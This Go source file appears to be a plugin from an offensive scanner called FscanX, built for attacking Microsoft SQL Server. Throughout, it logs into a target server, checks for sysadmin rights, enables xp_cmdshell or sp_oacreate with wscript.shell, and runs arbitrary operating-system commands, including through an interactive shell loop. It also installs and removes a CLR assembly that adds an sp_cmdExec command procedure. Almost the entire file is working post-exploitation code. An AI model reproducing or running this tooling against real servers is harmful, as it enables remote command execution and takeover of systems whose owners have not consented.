package plugin

import (
	"FscanX/config"
	"bufio"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
	"os"
)

// 连接mssql数据库

func ConnMSSQLDB(mssqlobj *config.MSSQLSHELL)(*sql.DB,error){
	var ConnString = fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v",
		mssqlobj.Host,
		mssqlobj.Port,
		mssqlobj.UserName,
		mssqlobj.PassWord,
		"master",
	)
	conn, err := sql.Open("mssql",ConnString)
	if err != nil {
		return nil,err
	}
	return conn,nil
}

func forCmdShell() string{
	fmt.Printf("[+] shell >> ")
	var str string
	//使用os.Stdin开启输入流
	in := bufio.NewScanner(os.Stdin)
	if in.Scan() {
		str = in.Text()
	}
	return str
}

func isAdminInDB(conn *sql.DB) bool {
	// 判断执行是否为sysadmin权限
	query ,err := conn.Prepare(`select '1'=(select is_srvrolemember('sysadmin'))`)
	if err != nil {
		//fmt.Println("[-] Username or Password is incorrect")
		config.WriteLogFile(config.LogFile,"[-] Username or Password is incorrect",config.Inlog)
		return false
	}
	var sysadmin int
	err = query.QueryRow().Scan(&sysadmin)
	if err != nil {
		//fmt.Println()
		config.WriteLogFile(config.LogFile,"[-] Login users do not have sysadmin permissions",config.Inlog)
		return false
	}
	_ = query.Close()
	return true
}

func exec_xp_shell(conn *sql.DB,cmd string,shellType int) error {
	if shellType == 1{
		xpquery ,_ := conn.Prepare(`EXEC master ..xp_cmdshell ?`)
		row ,err := xpquery.Query(cmd)
		if err != nil{
			//fmt.Println(fmt.Sprintf("exec %s is faild",cmd),err)
			config.WriteLogFile(config.LogFile,fmt.Sprintf("exec %s is faild",cmd),config.Inlog)

			return err
		}
		for row.Next(){
			var result string
			_ = row.Scan(&result)
			//fmt.Println(result)
			config.WriteLogFile(config.LogFile,result,config.Inlog)
		}
		defer func() {
			_ = row.Close()
		}()
		return nil
	}else if shellType == 2{
		spquery,_ := conn.Prepare(fmt.Sprintf(`declare @shell int,@exec int,@text int,@str varchar(8000);exec sp_oacreate 'wscript.shell',@shell output; exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c %v';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'ReadAll', @str out;select @str`,cmd))
		row,err := spquery.Query()
		if err != nil{
			//fmt.Println(fmt.Sprintf("exec %s is faild",cmd),err)
			config.WriteLogFile(config.LogFile,fmt.Sprintf("exec %s is faild",cmd),config.Inlog)

			return err
		}
		for row.Next(){
			var result string
			_ = row.Scan(&result)
			config.WriteLogFile(config.LogFile,result,config.Inlog)
		}
		defer func() {
			_ = row.Close()
		}()
	}
	return nil
}

func MSSQL_XP_CMD_SHELL(mssqlobj *config.MSSQLSHELL){
	conn, err := ConnMSSQLDB(mssqlobj) // 连接数据库
	if err != nil {
		fmt.Println()
		config.WriteLogFile(config.LogFile,"[-] The target database is not accessible ",config.Inlog)
	}
	// 是sysadmin权限
	if isAdminInDB(conn) {
		for _, sqlCommand := range config.XP_CMDSHELL{
			_, err = conn.Query(sqlCommand)
			if err != nil {
				//fmt.Println("[-] Open xp_cmdshell is failed ")
				config.WriteLogFile(config.LogFile,"[-] Open xp_cmdshell is failed ",config.Inlog)
				return
			}
		}
		//fmt.Println("[+] Open XP_CMDSHELL is success ")
		config.WriteLogFile(config.LogFile,"[+] Open XP_CMDSHELL is success ",config.Inlog)
		if mssqlobj.Commandline == true{
			for {
				cmd := forCmdShell()
				if cmd == "exit" || cmd == "quit"{
					return
				}
				if err := exec_xp_shell(conn,cmd,1);err != nil {
					continue
				}
			}
		}else{
			if mssqlobj.Command != "" {
				if err := exec_xp_shell(conn,mssqlobj.Command,1);err !=nil{
					return
				}
			}else{
				return
			}
		}
	}else{
		//fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		config.WriteLogFile(config.LogFile,"[-] Judgement mssql user is not sysadmin privilege",config.Inlog)
		return
	}
}

func MSSQL_SP_OACREATE(mssqlobj *config.MSSQLSHELL){
	conn, err := ConnMSSQLDB(mssqlobj) // 连接数据库
	if err != nil {
		//fmt.Println("[-] The target database is not accessible ")
		config.WriteLogFile(config.LogFile,"[-] The target database is not accessible ",config.Inlog)
	}
	if isAdminInDB(conn) == true {
		for _,sqlCommand := range config.SP_OACREATE {
			_ , err = conn.Query(sqlCommand)
			if err != nil {
				//fmt.Println("[-] Open SP_OACREATE is failed ")
				config.WriteLogFile(config.LogFile,"[-] Open SP_OACREATE is failed ",config.Inlog)
				return
			}
		}
		//fmt.Println("[+] Open SP_OACREATE is success ")
		config.WriteLogFile(config.LogFile,"[+] Open SP_OACREATE is success",config.Inlog)

		if mssqlobj.Commandline == true{
			for {
				cmd := forCmdShell()
				if cmd == "exit" || cmd == "quit"{
					return
				}
				if err := exec_xp_shell(conn,cmd,2);err != nil {
					continue
				}
			}
		}else{
			if mssqlobj.Command != "" {
				if err := exec_xp_shell(conn,mssqlobj.Command,2);err !=nil{
					//fmt.Println(err)
					config.WriteLogFile(config.LogFile,err.Error(),config.Inlog)
					return
				}
			}else{
				return
			}
		}
	}else{
		//fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		config.WriteLogFile(config.LogFile,"[-] Judgement mssql user is not sysadmin privilege",config.Inlog)
		return
	}
}
func INSTALLCLR(mssqlobj *config.MSSQLSHELL){
	conn, err := ConnMSSQLDB(mssqlobj) // 连接数据库
	if err != nil {
		//fmt.Println("[-] The target database is not accessible ")
		config.WriteLogFile(config.LogFile,"[-] The target database is not accessible ",config.Inlog)
	}
	if isAdminInDB(conn) == true {
		for _,sqlCommand := range config.CLR_CREATEDLL{
			_ , err = conn.Query(sqlCommand)
			if err != nil {
				//fmt.Println("[-] Try to install CLR is failed ")
				config.WriteLogFile(config.LogFile,"[-] Try to install CLR is failed ",config.Inlog)
				//fmt.Println(err)
				config.WriteLogFile(config.LogFile,err.Error(),config.Inlog)
				return
			}
		}
		//fmt.Println("[+] Install CLR is success")
		config.WriteLogFile(config.LogFile,"[+] Install CLR is success",config.Inlog)
		//fmt.Println("[+] You Can exec <EXEC sp_cmdExec 'whoami'> in SQL Manager to Test it")
		config.WriteLogFile(config.LogFile,"[+] You Can exec <EXEC sp_cmdExec 'whoami'> in SQL Manager to Test it",config.Inlog)
	}else{
		fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		return
	}
}

func UNINSTALLCLR(mssqlobj *config.MSSQLSHELL){
	conn, err := ConnMSSQLDB(mssqlobj) // 连接数据库
	if err != nil {
		//fmt.Println("[-] The target database is not accessible ")
		config.WriteLogFile(config.LogFile,"[-] The target database is not accessible ",config.Inlog)
	}
	if isAdminInDB(conn) == true {
		query,err := conn.Prepare(`DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]`)
		if err != nil {
			return
		}
		_, err = query.Query()
		if err != nil {
			//fmt.Println("[-] Try to UnInstall CLR is failed")
			config.WriteLogFile(config.LogFile,"[-] Try to UnInstall CLR is failed",config.Inlog)
			//fmt.Println("[-] may be not exist CLR execute extend")
			config.WriteLogFile(config.LogFile,"[-] may be not exist CLR execute extend",config.Inlog)
			return
		}
		//fmt.Println("[+] uninstall CLR extend is success")
		config.WriteLogFile(config.LogFile,"[+] uninstall CLR extend is success",config.Inlog)

	}else{
		//fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		config.WriteLogFile(config.LogFile,"[-] Judgement mssql user is not sysadmin privilege",config.Inlog)
		return
	}
}